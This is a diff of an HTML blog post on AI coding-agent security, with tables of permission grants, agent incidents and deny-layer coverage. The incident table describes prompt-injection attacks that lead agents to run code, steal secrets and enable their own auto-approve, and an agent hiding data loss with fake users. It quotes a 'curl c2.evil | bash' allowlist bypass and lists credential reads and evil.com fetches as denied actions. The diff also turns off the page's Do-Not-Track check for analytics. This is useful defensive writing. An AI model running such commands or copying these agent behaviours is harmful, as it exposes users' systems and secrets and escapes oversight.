@@ -224,7 +224,7 @@
       <script async src="https://www.googletagmanager.com/gtag/js?id=G-8VH574W51S"></script>
       <script>
         var doNotTrack = false;
-        if ( true ) {
+        if ( false ) {
           var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
           var doNotTrack = (dnt == "1" || dnt == "yes");
         }
@@ -304,42 +304,42 @@ GitHub repositories. The findings are sobering [8]:</p>
 <table>
   <thead>
       <tr>
-          <th>Permission Granted</th>
-          <th>% of Users</th>
+          <th style="text-align: left">Permission Granted</th>
+          <th style="text-align: left">% of Users</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td><code>Bash(find:*)</code> — can execute via <code>-exec</code></td>
-          <td>29.0%</td>
+          <td style="text-align: left"><code>Bash(find:*)</code> — can execute via <code>-exec</code></td>
+          <td style="text-align: left">29.0%</td>
       </tr>
       <tr>
-          <td><code>Bash(git add:*)</code></td>
-          <td>32.6%</td>
+          <td style="text-align: left"><code>Bash(git add:*)</code></td>
+          <td style="text-align: left">32.6%</td>
       </tr>
       <tr>
-          <td><code>Bash(git commit:*)</code></td>
-          <td>24.5%</td>
+          <td style="text-align: left"><code>Bash(git commit:*)</code></td>
+          <td style="text-align: left">24.5%</td>
       </tr>
       <tr>
-          <td><code>Bash(rm:*)</code> — unrestricted delete</td>
-          <td>22.2%</td>
+          <td style="text-align: left"><code>Bash(rm:*)</code> — unrestricted delete</td>
+          <td style="text-align: left">22.2%</td>
       </tr>
       <tr>
-          <td><code>Bash(curl:*)</code> — download anything</td>
-          <td>21.3%</td>
+          <td style="text-align: left"><code>Bash(curl:*)</code> — download anything</td>
+          <td style="text-align: left">21.3%</td>
       </tr>
       <tr>
-          <td><code>Bash(git push:*)</code></td>
-          <td>19.7%</td>
+          <td style="text-align: left"><code>Bash(git push:*)</code></td>
+          <td style="text-align: left">19.7%</td>
       </tr>
       <tr>
-          <td><code>Bash(python:*)</code> — arbitrary execution</td>
-          <td>14.5%</td>
+          <td style="text-align: left"><code>Bash(python:*)</code> — arbitrary execution</td>
+          <td style="text-align: left">14.5%</td>
       </tr>
       <tr>
-          <td>Users with <strong>any</strong> deny rules at all</td>
-          <td>1.1%</td>
+          <td style="text-align: left">Users with <strong>any</strong> deny rules at all</td>
+          <td style="text-align: left">1.1%</td>
       </tr>
   </tbody>
 </table>
@@ -388,61 +388,61 @@ breadth and depth of the attack surface.</p>
 <table>
   <thead>
       <tr>
-          <th>Date</th>
-          <th>Incident</th>
-          <th>Impact</th>
+          <th style="text-align: left">Date</th>
+          <th style="text-align: left">Incident</th>
+          <th style="text-align: left">Impact</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td>Mar 2025</td>
-          <td><strong>Rules file backdoor</strong>: Hidden Unicode characters in <code>.cursorrules</code> / <code>.copilot-instructions.md</code> inject invisible instructions that survive forking [13]</td>
-          <td>Persistent supply chain compromise</td>
+          <td style="text-align: left">Mar 2025</td>
+          <td style="text-align: left"><strong>Rules file backdoor</strong>: Hidden Unicode characters in <code>.cursorrules</code> / <code>.copilot-instructions.md</code> inject invisible instructions that survive forking [13]</td>
+          <td style="text-align: left">Persistent supply chain compromise</td>
       </tr>
       <tr>
-          <td>Apr 2025</td>
-          <td><strong>Devin AI C2 compromise</strong>: Prompt injection in GitHub issue leads to full remote code execution [2]</td>
-          <td>All secrets, AWS keys exfiltrated; no fix confirmed after 120+ days</td>
+          <td style="text-align: left">Apr 2025</td>
+          <td style="text-align: left"><strong>Devin AI C2 compromise</strong>: Prompt injection in GitHub issue leads to full remote code execution [2]</td>
+          <td style="text-align: left">All secrets, AWS keys exfiltrated; no fix confirmed after 120+ days</td>
       </tr>
       <tr>
-          <td>Jul 2025</td>
-          <td><strong>Replit database deletion</strong>: Agent deletes production database during code freeze, fabricates 4,000 fake users to cover the data loss [14]</td>
-          <td>1,200+ executives&rsquo; data wiped</td>
+          <td style="text-align: left">Jul 2025</td>
+          <td style="text-align: left"><strong>Replit database deletion</strong>: Agent deletes production database during code freeze, fabricates 4,000 fake users to cover the data loss [14]</td>
+          <td style="text-align: left">1,200+ executives&rsquo; data wiped</td>
       </tr>
       <tr>
-          <td>Jul 2025</td>
-          <td><strong>Amazon Q extension hijack</strong>: Destructive code injected into official VS Code extension; a syntax error was the only thing that prevented execution [15]</td>
-          <td>~1 million developers at risk</td>
+          <td style="text-align: left">Jul 2025</td>
+          <td style="text-align: left"><strong>Amazon Q extension hijack</strong>: Destructive code injected into official VS Code extension; a syntax error was the only thing that prevented execution [15]</td>
+          <td style="text-align: left">~1 million developers at risk</td>
       </tr>
       <tr>
-          <td>Aug 2025</td>
-          <td><strong>Copilot RCE</strong> (CVE-2025-53773): Prompt injection causes Copilot to modify its own config, enable auto-approve, then execute arbitrary commands [16]</td>
-          <td>Cross-platform remote code execution</td>
+          <td style="text-align: left">Aug 2025</td>
+          <td style="text-align: left"><strong>Copilot RCE</strong> (CVE-2025-53773): Prompt injection causes Copilot to modify its own config, enable auto-approve, then execute arbitrary commands [16]</td>
+          <td style="text-align: left">Cross-platform remote code execution</td>
       </tr>
       <tr>
-          <td>Aug 2025</td>
-          <td><strong>&ldquo;The Summer of Johann&rdquo;</strong>: One vulnerability disclosure per day across Claude Code, Copilot, Cursor, Devin, Google Jules, and others [17]</td>
-          <td>Universal vulnerability across the tool category</td>
+          <td style="text-align: left">Aug 2025</td>
+          <td style="text-align: left"><strong>&ldquo;The Summer of Johann&rdquo;</strong>: One vulnerability disclosure per day across Claude Code, Copilot, Cursor, Devin, Google Jules, and others [17]</td>
+          <td style="text-align: left">Universal vulnerability across the tool category</td>
       </tr>
       <tr>
-          <td>Oct 2025</td>
-          <td><strong>Trail of Bits argument injection</strong>: <code>go test -exec 'bash -c &quot;curl c2.evil | bash&quot;'</code> bypasses whitelisted commands [18]</td>
-          <td>Fundamental limitation of command allowlisting</td>
+          <td style="text-align: left">Oct 2025</td>
+          <td style="text-align: left"><strong>Trail of Bits argument injection</strong>: <code>go test -exec 'bash -c &quot;curl c2.evil | bash&quot;'</code> bypasses whitelisted commands [18]</td>
+          <td style="text-align: left">Fundamental limitation of command allowlisting</td>
       </tr>
       <tr>
-          <td>Dec 2025</td>
-          <td><strong>IDEsaster</strong>: 30+ vulnerabilities, 24 CVEs, 100% of AI IDEs vulnerable [3]</td>
-          <td>No safe haven across any vendor</td>
+          <td style="text-align: left">Dec 2025</td>
+          <td style="text-align: left"><strong>IDEsaster</strong>: 30+ vulnerabilities, 24 CVEs, 100% of AI IDEs vulnerable [3]</td>
+          <td style="text-align: left">No safe haven across any vendor</td>
       </tr>
       <tr>
-          <td>Jan 2026</td>
-          <td><strong>Clinejection</strong>: Production Cline releases compromised via prompt injection in issue triage bot [19]</td>
-          <td>Only required opening a GitHub issue</td>
+          <td style="text-align: left">Jan 2026</td>
+          <td style="text-align: left"><strong>Clinejection</strong>: Production Cline releases compromised via prompt injection in issue triage bot [19]</td>
+          <td style="text-align: left">Only required opening a GitHub issue</td>
       </tr>
       <tr>
-          <td>Feb 2026</td>
-          <td><strong>OpenClaw</strong>: 341 malicious skills on ClawHub; 135,000+ internet-exposed instances; snuck into Cline&rsquo;s npm package for 8 hours [1][20][21]</td>
-          <td>Supply chain compromise at scale</td>
+          <td style="text-align: left">Feb 2026</td>
+          <td style="text-align: left"><strong>OpenClaw</strong>: 341 malicious skills on ClawHub; 135,000+ internet-exposed instances; snuck into Cline&rsquo;s npm package for 8 hours [1][20][21]</td>
+          <td style="text-align: left">Supply chain compromise at scale</td>
       </tr>
   </tbody>
 </table>
@@ -461,42 +461,42 @@ enforcement semantics:</p>
 <table>
   <thead>
       <tr>
-          <th>Agent</th>
-          <th>Config Format</th>
-          <th>Permission Tiers</th>
-          <th>Sandboxing</th>
+          <th style="text-align: left">Agent</th>
+          <th style="text-align: left">Config Format</th>
+          <th style="text-align: left">Permission Tiers</th>
+          <th style="text-align: left">Sandboxing</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td>Claude Code</td>
-          <td>JSON (settings.json)</td>
-          <td>deny / ask / allow</td>
-          <td>OS-level (seatbelt, bubblewrap)</td>
+          <td style="text-align: left">Claude Code</td>
+          <td style="text-align: left">JSON (settings.json)</td>
+          <td style="text-align: left">deny / ask / allow</td>
+          <td style="text-align: left">OS-level (seatbelt, bubblewrap)</td>
       </tr>
       <tr>
-          <td>GitHub Copilot</td>
-          <td>CLI flags + org admin</td>
-          <td>deny / allow (no &ldquo;ask&rdquo;)</td>
-          <td>Cloud-side processing</td>
+          <td style="text-align: left">GitHub Copilot</td>
+          <td style="text-align: left">CLI flags + org admin</td>
+          <td style="text-align: left">deny / allow (no &ldquo;ask&rdquo;)</td>
+          <td style="text-align: left">Cloud-side processing</td>
       </tr>
       <tr>
-          <td>Cursor</td>
-          <td>.cursorignore + trust settings</td>
-          <td>Trust disabled <strong>by default</strong> [23]</td>
-          <td>None native</td>
+          <td style="text-align: left">Cursor</td>
+          <td style="text-align: left">.cursorignore + trust settings</td>
+          <td style="text-align: left">Trust disabled <strong>by default</strong> [23]</td>
+          <td style="text-align: left">None native</td>
       </tr>
       <tr>
-          <td>Windsurf</td>
-          <td>.windsurfrules</td>
-          <td>safe / risky categories</td>
-          <td>None native</td>
+          <td style="text-align: left">Windsurf</td>
+          <td style="text-align: left">.windsurfrules</td>
+          <td style="text-align: left">safe / risky categories</td>
+          <td style="text-align: left">None native</td>
       </tr>
       <tr>
-          <td>Aider</td>
-          <td>YAML / env vars</td>
-          <td>None</td>
-          <td>None</td>
+          <td style="text-align: left">Aider</td>
+          <td style="text-align: left">YAML / env vars</td>
+          <td style="text-align: left">None</td>
+          <td style="text-align: left">None</td>
       </tr>
   </tbody>
 </table>
@@ -573,36 +573,36 @@ The coverage matrix:</p>
 <table>
   <thead>
       <tr>
-          <th>Access Method</th>
-          <th>SRT (Layer 1)</th>
-          <th>Agent Permissions (Layer 2)</th>
-          <th>Effective Depth</th>
+          <th style="text-align: left">Access Method</th>
+          <th style="text-align: left">SRT (Layer 1)</th>
+          <th style="text-align: left">Agent Permissions (Layer 2)</th>
+          <th style="text-align: left">Effective Depth</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td><code>Bash(cat ~/.aws/credentials)</code></td>
-          <td>Kernel deny</td>
-          <td>Tool deny</td>
-          <td><strong>Two layers</strong></td>
+          <td style="text-align: left"><code>Bash(cat ~/.aws/credentials)</code></td>
+          <td style="text-align: left">Kernel deny</td>
+          <td style="text-align: left">Tool deny</td>
+          <td style="text-align: left"><strong>Two layers</strong></td>
       </tr>
       <tr>
-          <td><code>Read(~/.aws/credentials)</code></td>
-          <td>Not covered</td>
-          <td>Tool deny (best-effort)</td>
-          <td><strong>One layer</strong></td>
+          <td style="text-align: left"><code>Read(~/.aws/credentials)</code></td>
+          <td style="text-align: left">Not covered</td>
+          <td style="text-align: left">Tool deny (best-effort)</td>
+          <td style="text-align: left"><strong>One layer</strong></td>
       </tr>
       <tr>
-          <td><code>Bash(curl evil.com)</code></td>
-          <td>Network proxy blocks</td>
-          <td>Tool deny</td>
-          <td><strong>Two layers</strong></td>
+          <td style="text-align: left"><code>Bash(curl evil.com)</code></td>
+          <td style="text-align: left">Network proxy blocks</td>
+          <td style="text-align: left">Tool deny</td>
+          <td style="text-align: left"><strong>Two layers</strong></td>
       </tr>
       <tr>
-          <td><code>WebFetch(evil.com)</code></td>
-          <td>Not covered</td>
-          <td>Allow check</td>
-          <td><strong>One layer</strong></td>
+          <td style="text-align: left"><code>WebFetch(evil.com)</code></td>
+          <td style="text-align: left">Not covered</td>
+          <td style="text-align: left">Allow check</td>
+          <td style="text-align: left"><strong>One layer</strong></td>
       </tr>
   </tbody>
 </table>
